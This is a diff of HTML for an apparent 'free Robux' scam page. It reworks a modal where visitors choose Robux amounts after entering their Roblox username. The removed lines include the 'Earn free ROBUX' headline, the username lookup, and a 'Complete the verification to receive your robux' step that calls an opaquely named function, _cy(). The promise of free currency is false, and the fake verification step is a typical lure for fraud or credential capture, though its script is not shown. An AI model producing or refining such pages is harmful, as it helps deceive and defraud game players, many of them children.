@@ -37,96 +37,53 @@
             <div class="min-h-screen">
                 <div class="relative flex flex-col items-center justify-center w-full my-5">
                     <section class="w-full" id="homepage-section">
-                        <div class="absolute text-center md:text-left md:top-[150px] flex items-center justify-start w-full">
-                            <div class="flex flex-col items-center md:items-start container px-2 md:px-4 lg:px-[56px] mx-auto">
-                                <h1 class="text-4xl font-bold text-white lg:text-6xl xl:text-[5rem] max-w-[18ch]">
-                                    Earn free
-                                    <span
-                                        class="font-extrabold text-primary-400 text-transparent bg-clip-text drop-shadow-lg shadow-blue-500 bg-gradient-to-br from-primary-400 to-primary-600"
-                                        style="color: #6f7ade !important;"
-                                    >
-                                        ROBUX
-                                    </span>
-                                </h1>
-                                <p class="text-gray-400 text-sm lg:text-md py-6 max-w-[72ch]">FREE robux limited offer, Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.</p>
-                                <div class="max-w-xl py-10 px-6">
-                                    <input class="w-full px-4 py-2 rounded-xl shadow-md mb-4 text-lg border border-gray-300" id="username" placeholder="Enter your Roblox username" type="text"/>
-                                    <button class="bg-[#272930] text-white px-6 py-2 rounded-xl hover:bg-gray-800 transition mb-6" id="search-button" onclick="fetchProfile()">Search</button>
-                                </div>
+                        <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="robux-selection-modal">
+  <div class="bg-white p-6 rounded-2xl shadow-xl w-full max-w-[90%] md:max-w-2xl text-center animate-fade-in">
+    <div class="mt-6 text-center" id="profile">
+      <img class="w-24 h-24 mx-auto rounded-full mb-2 shadow-md" id="avatar" />
+      <p class="text-xl font-semibold" id="display-name"></p>
+    </div>
 
-                                <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="robux-selection-modal">
-                                    <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center animate-fade-in">
-                                        <div class="mt-6 text-center" id="profile">
-                                            <img class="w-24 h-24 mx-auto rounded-full mb-2 shadow-md" id="avatar"/>
-                                            <p class="text-xl font-semibold" id="display-name"></p>
-                                        </div>
+    <div class="mt-8" id="resource-section">
+      <p class="block text-lg font-medium mb-4">Select robux amount</p>
+      <div class="grid grid-cols-2 gap-4 md:grid-cols-4">
+        <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
+             onclick="selectResource(this, 800)">
+          <img alt="800 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg" />
+          <p class="text-xl font-semibold">800</p>
+        </div>
+        <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
+             onclick="selectResource(this, 1700)">
+          <img alt="1700 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg" />
+          <p class="text-xl font-semibold">1,700</p>
+        </div>
+        <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
+             onclick="selectResource(this, 4500)">
+          <img alt="4500 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg" />
+          <p class="text-xl font-semibold">4,500</p>
+        </div>
+        <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
+             onclick="selectResource(this, 10000)">
+          <img alt="10000 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg" />
+          <p class="text-xl font-semibold">10,000</p>
+        </div>
+      </div>
 
-                                        <div class="mt-8" id="resource-section">
-                                            <p class="block text-lg font-medium mb-4">Select robux amount</p>
-                                            <div class="grid grid-cols-2 gap-4">
-                                                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
-                                                    onclick="selectResource(this, 800)">
-                                                    <img alt="800 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
-                                                    <p class="text-xl font-semibold">800</p>
-                                                </div>
-                                                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
-                                                    onclick="selectResource(this, 1700)">
-                                                    <img alt="1700 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
-                                                    <p class="text-xl font-semibold">1,700</p>
-                                                </div>
-                                                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
-                                                    onclick="selectResource(this, 4500)">
-                                                    <img alt="4500 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
-                                                    <p class="text-xl font-semibold">4,500</p>
-                                                </div>
-                                                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
-                                                    onclick="selectResource(this, 10000)">
-                                                    <img alt="10000 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
-                                                    <p class="text-xl font-semibold">10,000</p>
-                                                </div>
-                                            </div>
-                                            <div class="flex justify-center mt-6">
-                                                <button class="hidden bg-green-600 text-white px-6 py-2 rounded-xl hover:bg-green-700 transition"
-                                                        id="confirm-button"
-                                                        onclick="confirmSelection()">
-                                                    Confirm
-                                                </button>
-                                            </div>
-                                        </div>
-                                        <button class="bg-gray-400 text-white px-4 py-2 rounded-xl hover:bg-gray-500 transition mt-4"
-                                                onclick="closeRobuxSelectionModal()">
-                                            Cancel
-                                        </button>
-                                    </div>
-                                </div>
-                                <div class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" id="loading-overlay">
-                                    <div class="text-center">
-                                        <div class="w-16 h-16 border-4 border-white border-dashed rounded-full animate-spin mx-auto mb-4"></div>
-                                        <p class="text-white text-xl font-semibold animate-pulse">Loading...</p>
-                                    </div>
-                                </div>
+      <div class="flex justify-center mt-6">
+        <button class="hidden bg-green-600 text-white px-6 py-2 rounded-xl hover:bg-green-700 transition"
+                id="confirm-button"
+                onclick="confirmSelection()">
+          Confirm
+        </button>
+      </div>
+    </div>
 
-                                <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="error-modal">
-                                    <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center">
-                                        <p class="text-red-600 font-semibold mb-4" id="error-modal-text">Error</p>
-                                        <button class="bg-red-500 text-white px-4 py-2 rounded-xl hover:bg-red-600 transition"
-                                                onclick="closeErrorModal()">
-                                            Close
-                                        </button>
-                                    </div>
-                                </div>
-
-                                <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="verify-step">
-                                    <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center animate-fade-in">
-                                        <p class="text-lg font-medium mb-4">Complete the verification to receive your robux.</p>
-                                        <button class="bg-[#272930] text-white px-4 py-2 rounded-xl hover:bg-gray-800 transition"
-                                                onclick="_cy()">
-                                            Verify
-                                        </button>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
+    <button class="bg-gray-400 text-white px-4 py-2 rounded-xl hover:bg-gray-500 transition mt-4"
+            onclick="closeRobuxSelectionModal()">
+      Cancel
+    </button>
+  </div>
+</div>
                         <div class="min-h-[calc(100vh-100px)] relative w-full overflow-x-hidden pointer-events-none flex justify-end">
                             <picture class="flex">
                                 <source srcset="/img/roblox_kkttjc_c_scalew_677.webp" media="(max-width: 677px)">
